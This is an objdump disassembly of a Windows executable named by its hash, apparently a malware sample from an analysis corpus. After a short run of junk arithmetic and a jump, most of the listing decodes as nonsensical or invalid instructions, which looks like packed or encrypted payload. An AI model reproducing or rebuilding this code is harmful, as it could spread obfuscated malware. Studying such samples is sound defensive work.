
6eb743637e5f07c96d52f33480dc4f31a08a3ffd5e47fe941ee6368dd15d7b74.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	sbb    DWORD PTR ds:0x42295a,0x42291e
  401019:	sub    eax,edx
  40101b:	push   edi
  40101c:	mov    edx,0x159a
  401021:	mov    edi,DWORD PTR [ebp-0x4c]
  401024:	mov    DWORD PTR [ebp-0x50],eax
  401027:	sbb    ecx,edi
  401029:	add    eax,eax
  40102b:	mov    DWORD PTR [ebp-0x4c],ecx
  40102e:	or     DWORD PTR [ebp-0x50],0xba68fc47
  401035:	or     DWORD PTR [ebp-0x4c],0x9c0a89d8
  40103c:	mov    eax,DWORD PTR [ebp-0x58]
  40103f:	mov    ecx,DWORD PTR [ebp-0x54]
  401042:	inc    edi
  401043:	mov    edx,DWORD PTR [ebp-0x58]
  401046:	adc    DWORD PTR ds:0x4228c2,0x7b28
  401050:	mov    edi,DWORD PTR [ebp-0x54]
  401053:	sub    eax,edx
  401055:	mov    edx,DWORD PTR ds:0x422926
  40105b:	mov    DWORD PTR [ebp-0x58],eax
  40105e:	sbb    ecx,edi
  401060:	xor    DWORD PTR ds:0x422936,ecx
  401066:	mov    DWORD PTR [ebp-0x54],ecx
  401069:	adc    edx,0x6dea
  40106f:	or     DWORD PTR [ebp-0x58],0xba68805f
  401076:	or     DWORD PTR [ebp-0x54],0x9c0a89d8
  40107d:	lea    eax,[ebp+0x20]
  401080:	mov    DWORD PTR [ebp-0xc],eax
  401083:	add    edx,edx
  401085:	mov    eax,ds:0x4220e0
  40108a:	mov    ecx,DWORD PTR [ebp-0xc]
  40108d:	mov    eax,DWORD PTR [eax]
  40108f:	xor    DWORD PTR ds:0x42293a,0x72a2
  401099:	add    eax,DWORD PTR [ecx]
  40109b:	xor    edx,edx
  40109d:	or     edx,DWORD PTR ds:0x422a4a
  4010a3:	mov    edx,DWORD PTR [edx]
  4010a5:	and    DWORD PTR ds:0x42299e,edx
  4010ab:	jmp    0x401635
  4010b0:	and    eax,0xffffffe4
  4010b3:	xor    eax,0xa0123954
  4010b8:	sbb    al,0x80
  4010ba:	mov    WORD PTR [esi-0x80],gs
  4010bd:	and    bl,BYTE PTR [esi+ebp*2+0x16]
  4010c1:	push   ss
  4010c2:	push   ss
  4010c3:	push   ss
  4010c4:	cmp    eax,0xaa161604
  4010c9:	test   DWORD PTR ds:0x40847e36,ecx
  4010cf:	mov    edi,0x241cf639
  4010d4:	dec    ecx
  4010d5:	popf   
  4010d6:	add    DWORD PTR [edi-0x23c604b1],edi
  4010dc:	rol    BYTE PTR [ebx+edx*8-0x3aaad908],0x9
  4010e4:	push   eax
  4010e5:	mov    dl,0xfe
  4010e7:	test   DWORD PTR [ecx+0x7894fd68],0xfdcbb128
  4010f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f2:	dec    esi
  4010f3:	sbb    DWORD PTR [eax+0x38],ecx
  4010f6:	xor    BYTE PTR [eax-0x36c9554f],dl
  4010fc:	pop    es
  4010fd:	cmp    edi,ebx
  4010ff:	dec    edx
  401100:	rcl    edx,cl
  401102:	inc    eax
  401103:	inc    ebp
  401104:	push   ecx
  401105:	jl     0x40110c
  401107:	pop    ss
  401108:	mov    esi,DWORD PTR [ebx-0x30]
  40110b:	dec    edx
  40110c:	dec    ebp
  40110d:	dec    esi
  40110e:	ror    BYTE PTR [eax+0x5f42789e],0x3a
  401115:	or     dl,bh
  401117:	mov    al,ds:0x42d8f959
  40111c:	daa    
  40111d:	bound  edi,QWORD PTR [edi-0x1d]
  401120:	scas   eax,DWORD PTR es:[edi]
  401121:	test   eax,0xa527f95d
  401126:	mov    ch,0x94
  401128:	pop    ds
  401129:	push   ss
  40112a:	inc    edi
  40112b:	fdiv   DWORD PTR [edx]
  40112d:	imul   esi,esp,0xd0d5aab1
  401133:	mov    eax,0x2ca27ede
  401138:	jecxz  0x4011a2
  40113a:	add    esp,DWORD PTR [ecx]
  40113c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40113d:	inc    ebp
  40113e:	fucomp st(6)
  401140:	loopne 0x401178
  401142:	mov    ds:0xf9f819cb,al
  401147:	hlt    
  401148:	push   ss
  401149:	rcl    DWORD PTR [ecx+0xd],1
  40114c:	out    0x16,eax
  40114e:	jmp    0xf33c01
  401153:	rol    esi,1
  401155:	retf   
  401156:	mov    dh,0x34
  401158:	xor    bh,dl
  40115a:	push   edx
  40115b:	and    BYTE PTR [ecx-0x7eb27591],bl
  401161:	inc    ebp
  401162:	fiadd  DWORD PTR [edx+0x1c7382ea]
  401168:	sti    
  401169:	inc    ebp
  40116a:	push   ds
  40116b:	sbb    bh,al
  40116d:	xchg   ebx,eax
  40116e:	ds repnz xchg edi,eax
  401171:	sbb    eax,DWORD PTR [ebp+0x3ac7f4c3]
  401177:	add    al,0x4f
  401179:	outs   dx,BYTE PTR ds:[esi]
  40117a:	(bad)  
  40117c:	popa   
  40117d:	sub    al,0x3b
  40117f:	jns    0x4011a6
  401181:	pop    esi
  401182:	adc    edx,esi
  401184:	push   ss
  401185:	push   ebp
  401186:	mov    al,0x7
  401188:	or     al,0x49
  40118a:	cmp    al,0x93
  40118c:	adc    ch,bh
  40118e:	add    al,0x9d
  401190:	loopne 0x4011ee
  401192:	pop    edi
  401193:	mov    dl,0x82
  401195:	cmc    
  401196:	cwde   
  401197:	and    eax,0xec34793b
  40119c:	pushf  
  40119d:	outs   dx,BYTE PTR ds:[esi]
  40119e:	and    DWORD PTR [edx+0x4e93af0d],0xdfae0179
  4011a8:	mov    al,0x23
  4011aa:	xor    esp,DWORD PTR [ecx+0x2a]
  4011ad:	cmp    al,0x56
  4011af:	ficom  WORD PTR [ebx+0x943aa6f]
  4011b5:	xchg   esi,eax
  4011b6:	(bad)  
  4011b7:	std    
  4011b8:	fld    DWORD PTR [eax+0x6c]
  4011bb:	dec    esp
  4011bc:	imul   ebp,DWORD PTR [edi],0x57
  4011bf:	(bad)  
  4011c0:	stos   DWORD PTR es:[edi],eax
  4011c1:	adc    dh,BYTE PTR [edi]
  4011c3:	inc    ecx
  4011c4:	fbld   TBYTE PTR [eax]
  4011c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011c8:	mov    ds:0x2e418908,eax
  4011cd:	dec    ebp
  4011ce:	mov    ecx,0x34948f23
  4011d3:	inc    ebx
  4011d4:	icebp  
  4011d5:	cmp    ch,BYTE PTR [edi-0x58b9f970]
  4011db:	mov    ds:0x53c07943,eax
  4011e0:	cmp    al,BYTE PTR [edi]
  4011e2:	mov    eax,0x96d272c0
  4011e7:	or     DWORD PTR [ebp+ecx*1-0x10aa709c],0xf1120441
  4011f2:	shr    ch,0xbd
  4011f5:	gs adc al,0x70
  4011f8:	sbb    DWORD PTR [esi+0x1],edi
  4011fb:	jo     0x40120f
  4011fd:	dec    esi
  4011fe:	popf   
  4011ff:	or     esp,edi
  401201:	pop    esp
  401202:	aaa    
  401203:	push   0xffffff9c
  401205:	xchg   edi,eax
  401206:	std    
  401207:	retf   
  401208:	pop    edx
  401209:	adc    al,al
  40120b:	aas    
  40120c:	int3   
  40120d:	xlat   BYTE PTR ds:[ebx]
  40120e:	ret    
  40120f:	inc    esp
  401210:	test   al,0x20
  401212:	fs pusha 
  401214:	cwde   
  401215:	daa    
  401216:	fs test eax,0x8318d399
  40121c:	leave  
  40121d:	and    BYTE PTR [ebx+0x4c],0x90
  401221:	adc    BYTE PTR [esi+0x54],bl
  401224:	mov    DWORD PTR [esp+ecx*1],eax
  401227:	shl    DWORD PTR [edx+edx*4-0x4e],cl
  40122b:	cmp    al,BYTE PTR [edx+0x560e9a92]
  401231:	retf   0x42cb
  401234:	(bad)  
  401235:	mov    cs,ebx
  401237:	inc    ebp
  401238:	int3   
  401239:	outs   dx,BYTE PTR ds:[esi]
  40123a:	icebp  
  40123b:	dec    eax
  40123c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40123d:	mov    eax,0x9e393026
  401242:	pop    ebx
  401243:	inc    ebx
  401244:	fnstsw WORD PTR [edi-0x7ea1122c]
  40124a:	(bad)  
  40124b:	push   edx
  40124c:	and    cl,bh
  40124e:	pushf  
  40124f:	xchg   esi,eax
  401250:	iret   
  401251:	ficomp WORD PTR [esi+0x3]
  401254:	lods   al,BYTE PTR ds:[esi]
  401255:	or     BYTE PTR [ebp-0x4dd3b6cd],cl
  40125b:	aas    
  40125c:	lahf   
  40125d:	and    bh,BYTE PTR [esi+0x5068e848]
  401263:	mov    dl,0xdd
  401265:	sub    DWORD PTR [edi-0x5b50d6ca],ebp
  40126b:	inc    ecx
  40126c:	(bad)  
  40126d:	pop    ebx
  40126e:	adc    BYTE PTR [ebx+ebp*4+0x10bcda82],0x79
  401276:	scas   eax,DWORD PTR es:[edi]
  401277:	fwait
  401278:	rcr    BYTE PTR [edi],1
  40127a:	leave  
  40127b:	bound  ecx,QWORD PTR [ecx-0x3]
  40127e:	and    al,0xf7
  401280:	jbe    0x401212
  401282:	sahf   
  401283:	lds    ebx,FWORD PTR [eax]
  401285:	retf   
  401286:	jl     0x401276
  401288:	xor    ebp,esp
  40128a:	pop    ds
  40128b:	sub    BYTE PTR [eax],0x1a
  40128e:	jle    0x401294
  401290:	mov    edi,0x75bd6c58
  401295:	xchg   ebp,eax
  401296:	jmp    0x40129d
  401298:	mov    cl,0xab
  40129a:	sbb    ch,dh
  40129c:	sti    
  40129d:	pusha  
  40129e:	or     al,0xdf
  4012a0:	xchg   edx,eax
  4012a1:	and    dh,0xf7
  4012a4:	xor    eax,0xba6f4bd8
  4012a9:	cmp    ah,BYTE PTR [ecx-0x6af425be]
  4012af:	pop    eax
  4012b0:	xlat   BYTE PTR ds:[ebx]
  4012b1:	mov    ?,eax
  4012b3:	ja     0x4012fc
  4012b5:	rcl    BYTE PTR [edi-0x65],1
  4012b8:	mov    BYTE PTR ds:0x5e501388,ch
  4012be:	sbb    al,0x5e
  4012c0:	lahf   
  4012c1:	data16 loope 0x401267
  4012c4:	and    al,0x31
  4012c6:	out    0xae,al
  4012c8:	(bad)  [ebx-0x36eb9bf1]
  4012ce:	xlat   BYTE PTR ds:[ebx]
  4012cf:	sub    esi,DWORD PTR [edx+0x32]
  4012d2:	rcl    BYTE PTR [esi+ebp*4],cl
  4012d5:	aam    0x10
  4012d7:	repnz pop esp
  4012d9:	mov    ch,BYTE PTR [esi+0x3f1f8e83]
  4012df:	pmovmskb ebx,mm3
  4012e2:	ficom  WORD PTR [ebx+ebp*4]
  4012e5:	or     al,0x85
  4012e7:	xor    al,0xa9
  4012e9:	loop   0x40127a
  4012eb:	es add eax,0x98e18dfd
  4012f1:	inc    ecx
  4012f2:	shl    BYTE PTR [edx+ecx*4],0xe7
  4012f6:	shl    BYTE PTR [edi],cl
  4012f8:	mov    al,0xc4
  4012fa:	stos   BYTE PTR es:[edi],al
  4012fb:	iret   
  4012fc:	and    BYTE PTR [ecx-0x3a],0x74
  401300:	mov    esp,0xed67543
  401305:	mov    sp,0x3631
  401309:	jecxz  0x40129d
  40130b:	aad    0x13
  40130d:	es jmp 0x401298
  401310:	cld    
  401311:	data16 daa 
  401313:	jbe    0x40137b
  401315:	hlt    
  401316:	loope  0x401349
  401318:	jg     0x401348
  40131a:	jge    0x4012eb
  40131c:	xchg   ecx,eax
  40131d:	cmp    BYTE PTR [ecx-0x614655e],dl
  401323:	sbb    edi,ebp
  401325:	dec    edi
  401326:	pop    edx
  401327:	jmp    0x1305ead0
  40132c:	xor    eax,0xff379a0f
  401331:	call   0xb231:0x121cc072
  401338:	adc    eax,0x26f980db
  40133d:	(bad)  
  40133e:	xchg   edi,eax
  40133f:	xchg   ebp,eax
  401340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401341:	sub    al,0xfd
  401343:	int    0xf
  401345:	sub    al,0x2b
  401347:	rcr    DWORD PTR [ecx+0x5785a3f],0x55
  40134e:	xor    al,0x63
  401350:	loope  0x40131d
  401352:	outs   dx,DWORD PTR ds:[esi]
  401353:	in     al,dx
  401354:	fdiv   st,st(4)
  401356:	jg     0x40132e
  401358:	retf   
  401359:	aas    
  40135a:	rcl    cl,cl
  40135c:	mov    ?,ebx
  40135e:	inc    esi
  40135f:	ret    
  401360:	pop    es
  401361:	shr    BYTE PTR [edx],0xb8
  401364:	jp     0x4013b9
  401366:	mov    edx,0xccac0e0b
  40136b:	or     al,0x28
  40136d:	lods   al,BYTE PTR ds:[esi]
  40136e:	(bad)  
  40136f:	(bad)  
  401370:	(bad)  
  401371:	lds    ebx,FWORD PTR ds:0xef59891d
  401377:	loope  0x4013af
  401379:	mul    BYTE PTR [ebx-0x6a34be4e]
  40137f:	es cmc 
  401381:	test   DWORD PTR [edx-0x793a641f],esi
  401387:	mov    esi,0xe83faed4
  40138c:	mov    ebx,0x2d7b9d7e
  401391:	mov    eax,ds:0x4368edf0
  401396:	pop    ss
  401397:	call   0xe1497041
  40139c:	das    
  40139d:	jg     0x401323
  40139f:	add    dl,BYTE PTR [ebp-0x7f]
  4013a2:	jge    0x40140d
  4013a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013a5:	jns    0x401402
  4013a7:	mov    DWORD PTR [ecx-0x7507fa08],ebp
  4013ad:	push   ebx
  4013ae:	loope  0x401401
  4013b0:	jo     0x4013ca
  4013b2:	and    ecx,ecx
  4013b4:	jo     0x40137a
  4013b6:	push   esi
  4013b7:	imul   esp,DWORD PTR [esp+ebx*1-0x14ff4242],0xffffffd9
  4013bf:	sti    
  4013c0:	sbb    dh,ah
  4013c2:	sbb    BYTE PTR [edx],al
  4013c4:	dec    ecx
  4013c5:	scas   al,BYTE PTR es:[edi]
  4013c6:	mov    ebx,0x1d4e72bf
  4013cb:	push   0xffffff9d
  4013cd:	pop    ebp
  4013ce:	inc    ebp
  4013cf:	jecxz  0x40139d
  4013d1:	test   DWORD PTR [ecx+0x49babc24],ebp
  4013d7:	js     0x401362
  4013d9:	shl    DWORD PTR [ecx+0x5aa50bb7],1
  4013df:	xchg   ecx,eax
  4013e0:	inc    ebx
  4013e1:	rol    BYTE PTR [ecx+0x3e],1
  4013e4:	loope  0x4013ac
  4013e6:	sub    al,0x92
  4013e8:	or     bl,BYTE PTR [ebp+0x4dc370cf]
  4013ee:	scas   eax,DWORD PTR es:[edi]
  4013ef:	daa    
  4013f0:	xchg   edi,eax
  4013f1:	add    edi,edx
  4013f3:	outs   dx,DWORD PTR ds:[esi]
  4013f4:	inc    esi
  4013f5:	sub    edx,DWORD PTR [edi+0x71]
  4013f8:	ret    
  4013f9:	mov    ebp,0x248c6807
  4013fe:	jecxz  0x4013a2
  401400:	dec    ebp
  401401:	inc    edx
  401402:	jbe    0x401388
  401404:	cmp    ebx,0xf61d5614
  40140a:	jp     0x40142e
  40140c:	or     eax,0xa2a676c
  401411:	ins    BYTE PTR es:[edi],dx
  401412:	aad    0xac
  401414:	call   0xc8bc9ed9
  401419:	call   FWORD PTR [eax-0x28]
  40141c:	mov    cl,0x9
  40141e:	push   ecx
  40141f:	in     al,0x9c
  401421:	(bad)  
  401422:	pop    ebx
  401423:	cli    
  401424:	out    dx,eax
  401425:	jns    0x4013f0
  401427:	shl    BYTE PTR [esi+0x1149aa2e],0x37
  40142e:	lea    esp,[ecx-0x36]
  401431:	in     al,0x28
  401433:	mov    al,0x56
  401435:	fidiv  DWORD PTR [ecx+0x21]
  401438:	iret   
  401439:	call   0x1265:0x62bea15c
  401440:	mov    dh,0xd1
  401442:	pop    ecx
  401443:	or     BYTE PTR [edx],cl
  401445:	in     eax,0x5
  401447:	push   ds
  401448:	adc    esp,ecx
  40144a:	mov    esp,DWORD PTR [ebp+0x7a]
  40144d:	jle    0x401422
  40144f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401450:	inc    eax
  401451:	xor    ah,ah
  401453:	test   dh,cl
  401455:	push   ds
  401456:	mov    al,0xcd
  401458:	ret    
  401459:	cmp    dh,BYTE PTR [ebx+0x56]
  40145c:	das    
  40145d:	inc    eax
  40145e:	inc    ebx
  40145f:	fsubr  st,st(4)
  401461:	mov    esp,0x43ea5997
  401466:	or     ecx,esi
  401468:	imul   ebp,DWORD PTR [ebx-0x50],0xe3d5e66a
  40146f:	xor    eax,0x241f4e87
  401474:	jmp    0x7bc4:0xc9f9512b
  40147b:	rcl    DWORD PTR ds:[ebx-0x7d],1
  40147f:	push   esp
  401480:	or     ebx,DWORD PTR [ecx]
  401482:	jl     0x401431
  401484:	push   ds
  401485:	inc    ecx
  401486:	jno    0x4014e7
  401488:	out    0xe2,eax
  40148a:	cmp    ecx,DWORD PTR [ecx-0x626b4d80]
  401490:	jno    0x401480
  401492:	mov    ecx,0xfa4ca2a4
  401497:	fs xchg ecx,eax
  401499:	cmp    DWORD PTR [bx+di+0x2c38],edx
  40149e:	out    0x71,eax
  4014a0:	mov    ah,0xe3
  4014a2:	or     BYTE PTR [eax-0x34],bl
  4014a5:	loope  0x401504
  4014a7:	aaa    
  4014a8:	sub    dl,BYTE PTR [edx-0x4f]
  4014ab:	(bad)  
  4014ac:	lock cmp dl,BYTE PTR [edx]
  4014af:	mov    edi,0xe7b3b32e
  4014b4:	add    ah,al
  4014b6:	and    BYTE PTR [edx-0x2f],al
  4014b9:	xor    dl,dl
  4014bb:	dec    ebp
  4014bc:	enter  0x56db,0x68
  4014c0:	jle    0x40151a
  4014c2:	mov    edx,0xc7e0eed2
  4014c7:	popa   
  4014c8:	in     al,dx
  4014c9:	sti    
  4014ca:	leave  
  4014cb:	push   eax
  4014cc:	hlt    
  4014cd:	fstp   QWORD PTR [ecx+0x77]
  4014d0:	jo     0x4014a6
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	sub    ebp,DWORD PTR [ecx]
  4014d5:	arpl   dx,bx
  4014d7:	call   0x6600:0x40233b40
  4014de:	xchg   ebp,eax
  4014df:	test   eax,0xeb3e5813
  4014e4:	lods   eax,DWORD PTR ds:[esi]
  4014e5:	nop
  4014e6:	mov    edx,0xca3227e5
  4014eb:	jbe    0x401512
  4014ed:	inc    ebx
  4014ee:	cdq    
  4014ef:	mov    esp,0x83b67ce6
  4014f4:	in     al,dx
  4014f5:	shld   DWORD PTR [edi-0x16],ecx,0xf1
  4014fa:	inc    edx
  4014fb:	cmp    eax,0xb4e9765
  401500:	xor    ch,BYTE PTR [ebp-0x20]
  401503:	jno    0x4014d8
  401505:	and    BYTE PTR [edx-0x8ef36a0],0xd
  40150c:	out    0xe0,eax
  40150e:	mov    al,ds:0xf939f9df
  401513:	(bad)  
  401514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401515:	sub    al,0x60
  401517:	mov    dl,0x40
  401519:	and    ch,0x2a
  40151c:	rcl    DWORD PTR [ebx],0x66
  40151f:	mov    edi,0xb00cc37f
  401524:	in     eax,0xb0
  401526:	int    0x24
  401528:	xor    ch,BYTE PTR [eax]
  40152a:	push   ebp
  40152b:	and    BYTE PTR [esi+0x2],bh
  40152e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40152f:	out    dx,eax
  401530:	fs scas eax,DWORD PTR es:[edi]
  401532:	mov    dh,0xec
  401534:	lock or eax,ecx
  401537:	out    dx,al
  401538:	int3   
  401539:	hlt    
  40153a:	stos   DWORD PTR es:[edi],eax
  40153b:	in     ax,0x1e
  40153e:	fnstcw WORD PTR [esi+0x659740d5]
  401544:	cs xor al,0xe3
  401547:	(bad)  
  401548:	aaa    
  401549:	push   ebp
  40154a:	test   eax,0x55f6981a
  40154f:	fstp   DWORD PTR [esi]
  401551:	sbb    BYTE PTR [ebp+0x12],dh
  401554:	popa   
  401555:	xor    ebp,DWORD PTR [esi]
  401557:	push   esi
  401558:	mov    esi,0x357e7b7
  40155d:	inc    ecx
  40155e:	pop    edx
  40155f:	mov    ds,esi
  401561:	add    BYTE PTR ds:0x70795909,0x0
  401568:	loop   0x40150b
  40156a:	cmc    
  40156b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40156c:	push   ds
  40156d:	push   ds
  40156e:	pop    edx
  40156f:	outs   dx,DWORD PTR ds:[esi]
  401570:	mov    dh,0x37
  401572:	or     DWORD PTR cs:[esi],0xffffff85
  401576:	and    al,0x34
  401578:	xchg   ecx,eax
  401579:	sbb    BYTE PTR [esi+0x1d4a00d4],dh
  40157f:	sar    DWORD PTR [esi+0x26692d28],0x74
  401586:	neg    BYTE PTR [ecx-0x8cdafe2]
  40158c:	stos   BYTE PTR es:[edi],al
  40158d:	enter  0x9e19,0x9e
  401591:	add    BYTE PTR [esi-0x6f7eb286],bh
  401597:	and    BYTE PTR ds:0x62081440,ch
  40159d:	dec    eax
  40159e:	(bad)  
  40159f:	pop    esp
  4015a0:	pand   mm7,QWORD PTR cs:[esi-0x683f59c7]
  4015a8:	mov    eax,0x8dcd0e11
  4015ad:	fld    QWORD PTR [edx+0x1291a3c8]
  4015b3:	sti    
  4015b4:	fs push ecx
  4015b6:	add    ebp,DWORD PTR [ebp+0x26]
  4015b9:	(bad)  [eax+eax*8-0x18]
  4015bd:	xchg   ebp,eax
  4015be:	in     eax,0xd
  4015c0:	aaa    
  4015c1:	test   eax,0xae364a55
  4015c6:	and    ah,BYTE PTR [eax]
  4015c8:	push   0x9ace38b3
  4015cd:	pop    ss
  4015ce:	inc    esp
  4015cf:	mov    eax,ds:0x5e9e2265
  4015d4:	mov    eax,ss
  4015d6:	mov    ds:0x55556b99,al
  4015db:	ins    DWORD PTR es:[edi],dx
  4015dc:	mov    BYTE PTR [edi-0x276c18d],0xcf
  4015e3:	mov    DWORD PTR [esi],ebx
  4015e5:	rol    BYTE PTR [esi+0x16],1
  4015e8:	or     BYTE PTR [edx+0x7c],bh
  4015eb:	or     ch,BYTE PTR [edi-0x4c9b5558]
  4015f1:	enter  0x33a6,0x78
  4015f5:	pop    ds
  4015f6:	inc    esi
  4015f7:	cmp    eax,0x4b83fe9d
  4015fc:	xchg   edi,eax
  4015fd:	dec    ebp
  4015fe:	mov    ds:0xa91fcc4c,eax
  401603:	xlat   BYTE PTR ds:[ebx]
  401604:	neg    DWORD PTR [eax+0x69f299cd]
  40160a:	out    dx,al
  40160b:	pop    es
  40160c:	add    bh,ch
  40160e:	cmp    esi,edx
  401610:	in     eax,dx
  401611:	push   eax
  401612:	test   BYTE PTR [ecx-0x1],dl
  401615:	xchg   ecx,eax
  401616:	mov    ds:0xafb81f43,al
  40161b:	add    eax,0xb11ed696
  401620:	mov    ds:0xd283c8e5,eax
  401625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401626:	mov    al,ds:0x888f6acc
  40162b:	addr16 sbb bh,bh
  40162e:	mov    DWORD PTR [edi],ecx
  401630:	lods   eax,DWORD PTR ds:[esi]
  401631:	jae    0x4015f3
  401633:	push   esp
  401634:	popa   
  401635:	mov    edi,0x2e9a655c
  40163a:	xor    edx,DWORD PTR ds:0x4228e2
  401640:	mov    DWORD PTR [ebp-0x14],eax
  401643:	add    DWORD PTR ds:0x4228a6,ebx
  401649:	mov    eax,DWORD PTR [ebp+0x18]
  40164c:	jmp    0x401bd6
  401651:	fdivr  DWORD PTR [ebp+0x2c]
  401654:	lds    ebp,FWORD PTR [eax]
  401656:	xchg   esp,eax
  401657:	pop    eax
  401658:	and    BYTE PTR [ecx+0x27b2ceab],dl
  40165e:	add    eax,0x43d7426
  401663:	push   ss
  401664:	push   ss
  401665:	cmp    eax,0x13161604
  40166a:	add    DWORD PTR [esi],ecx
  40166c:	out    dx,eax
  40166d:	cmp    esi,ecx
  40166f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401670:	mov    al,0x7e
  401672:	dec    esi
  401673:	out    dx,al
  401674:	sar    BYTE PTR [edx-0x7e],0x43
  401678:	test   al,0xec
  40167a:	sbb    esp,eax
  40167c:	popa   
  40167d:	mov    ebx,0x4dfedcad
  401682:	dec    esi
  401683:	cli    
  401684:	loopne 0x4016fd
  401686:	aam    0x45
  401688:	mov    al,0xc2
  40168a:	mov    WORD PTR ds:0x9682bd18,ds
  401690:	add    al,0xb
  401692:	mov    eax,ds:0xafc92a3e
  401697:	dec    esp
  401698:	mov    edi,esp
  40169a:	imul   eax,esi,0xffffffb7
  40169d:	(bad)  
  40169e:	test   DWORD PTR [eax],0xd8c09ba1
  4016a4:	sub    al,0x2f
  4016a6:	inc    DWORD PTR ds:0x77b8f276
  4016ac:	mov    ebp,0xeda36d57
  4016b1:	inc    ebx
  4016b2:	add    eax,0xf05f1ef7
  4016b7:	pop    es
  4016b8:	xchg   ecx,eax
  4016b9:	rcl    cl,0x66
  4016bc:	inc    ecx
  4016bd:	ss into 
  4016bf:	mov    al,ds:0x8067951c
  4016c4:	test   al,0x6f
  4016c6:	(bad)  
  4016c7:	adc    eax,0x5dbff651
  4016cc:	fist   DWORD PTR [edi+0x26a66baa]
  4016d2:	mov    esi,0x88f0e4a0
  4016d7:	cmp    BYTE PTR [edi-0x79],0x7a
  4016db:	repz jl 0x401682
  4016de:	scas   eax,DWORD PTR es:[edi]
  4016df:	mov    eax,DWORD PTR [edi+0x22]
  4016e2:	adc    al,0x2b
  4016e4:	stc    
  4016e5:	sub    BYTE PTR [ecx],0xa8
  4016e8:	jne    0x40169e
  4016ea:	rcr    edi,cl
  4016ec:	pop    ebx
  4016ed:	repz xlat BYTE PTR ds:[ebx]
  4016ef:	iret   
  4016f0:	sbb    BYTE PTR ds:0x8530b71a,bh
  4016f6:	js     0x4016cf
  4016f8:	lock jmp 0x4016e1
  4016fb:	push   edx
  4016fc:	mov    cl,0x5b
  4016fe:	popf   
  4016ff:	sub    al,BYTE PTR ds:0xbb148e14
  401705:	maskmovq mm6,(bad)
  401706:	div    DWORD PTR [ebx+edi*1-0x18a998a8]
  40170d:	inc    edx
  40170e:	jae    0x40170a
  401710:	push   cs
  401711:	add    esi,DWORD PTR [edi+esi*1]
  401714:	mov    WORD PTR [eax],ss
  401716:	ficom  DWORD PTR [ecx-0x7525f305]
  40171c:	jmp    0x12f6:0x407aef63
  401723:	aad    0xc1
  401725:	les    ecx,FWORD PTR [ebp+esi*8-0x50]
  401729:	or     al,0xe0
  40172b:	es daa 
  40172d:	inc    esp
  40172e:	outs   dx,DWORD PTR ds:[esi]
  40172f:	enter  0x98d1,0x5
  401733:	mov    DWORD PTR [ebx],0x2fe2386f
  401739:	mov    ebx,esi
  40173b:	cmc    
  40173c:	aaa    
  40173d:	out    0xb6,eax
  40173f:	(bad)  
  401740:	xchg   edx,eax
  401741:	mov    ?,WORD PTR [ecx]
  401743:	mov    ah,0x99
  401745:	pop    edi
  401746:	mov    edi,0x6904860e
  40174b:	add    al,0x96
  40174d:	les    esi,FWORD PTR [edi+0x4f91e2de]
  401753:	inc    ecx
  401754:	leave  
  401755:	add    ch,BYTE PTR [edx]
  401757:	aas    
  401758:	xor    cl,0xff
  40175b:	xor    eax,0xf55091d5
  401760:	xor    BYTE PTR [ebx+0x10a2586f],ah
  401766:	or     al,0x1a
  401768:	jae    0x401785
  40176a:	xchg   ebp,eax
  40176b:	mov    ebp,0x9932d486
  401770:	fiadd  DWORD PTR [esp+ebp*1-0x42]
  401774:	mov    eax,ds:0x1ff8d88f
  401779:	rep ins BYTE PTR es:[edi],dx
  40177b:	push   esi
  40177c:	popa   
  40177d:	mov    edi,0xd0a2a397
  401782:	hlt    
  401783:	push   esp
  401784:	pop    edi
  401785:	xchg   ebp,eax
  401786:	lds    edx,FWORD PTR [ebp-0x27]
  401789:	cmp    al,0xb8
  40178b:	mov    al,0x76
  40178d:	jnp    0x401781
  40178f:	scas   al,BYTE PTR es:[edi]
  401790:	out    0xc9,eax
  401792:	ficomp WORD PTR [eax+0x64]
  401795:	call   0x9c4ff48c
  40179a:	push   ebx
  40179b:	sub    BYTE PTR [edx+0x594fee47],cl
  4017a1:	xchg   BYTE PTR [edx-0x4e6d7b9],al
  4017a7:	fld    QWORD PTR [ebx-0x3f]
  4017aa:	inc    ebp
  4017ab:	(bad)  
  4017ac:	push   0x86c807b2
  4017b1:	cld    
  4017b2:	in     eax,0x23
  4017b4:	fidivr DWORD PTR [edx-0x1d9e4754]
  4017ba:	in     al,0xd3
  4017bc:	mov    al,0xe6
  4017be:	inc    edx
  4017bf:	retf   0x61ed
  4017c2:	popf   
  4017c3:	xchg   edi,eax
  4017c4:	lds    edx,FWORD PTR [ebx+0x40]
  4017c7:	les    ecx,FWORD PTR [esi]
  4017c9:	xchg   ebp,eax
  4017ca:	lods   eax,DWORD PTR ds:[esi]
  4017cb:	imul   ebp,ebp,0xef3a8ee0
  4017d1:	pusha  
  4017d2:	ret    0x8fc2
  4017d5:	dec    ebp
  4017d6:	xor    ah,al
  4017d8:	xor    bh,ah
  4017da:	fldcw  WORD PTR fs:[eax]
  4017dd:	cmp    al,0x5a
  4017df:	jns    0x8dd0a7d
  4017e5:	cmp    eax,ebx
  4017e7:	test   BYTE PTR [ecx-0x5a60da15],dh
  4017ed:	frstor [eax-0x37c8bb72]
  4017f3:	push   ebp
  4017f4:	dec    ebx
  4017f5:	pop    ss
  4017f6:	pop    ds
  4017f7:	fwait
  4017f8:	or     eax,0x68ff7c31
  4017fd:	sbb    ch,BYTE PTR [ebp-0x15]
  401800:	jge    0x401865
  401802:	aam    0x76
  401804:	adc    DWORD PTR fs:[edx-0x49542d1d],esi
